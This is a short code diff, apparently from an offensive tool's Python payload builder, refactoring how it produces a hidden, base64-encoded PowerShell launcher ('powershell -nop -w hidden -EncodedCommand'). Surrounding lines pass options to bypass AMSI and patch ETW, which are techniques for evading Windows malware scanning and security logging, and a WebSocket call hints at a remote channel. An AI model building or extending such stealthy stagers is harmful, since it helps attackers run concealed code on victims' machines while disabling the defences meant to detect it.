@@ -80,5 +80,4 @@ try {{ $ws.CloseAsync([Net.WebSockets.WebSocketCloseStatus]::NormalClosure,'bye'
 			bypass_amsi=bool(self.bypass_amsi),
 			patch_etw=bool(self.patch_etw),
 		) + self._build_script()
-		encoded = base64.b64encode(script.encode("utf-16le")).decode("ascii")
-		return f"powershell -nop -w hidden -EncodedCommand {encoded}"
+		return self._encode_powershell_command(script, window_style="hidden")
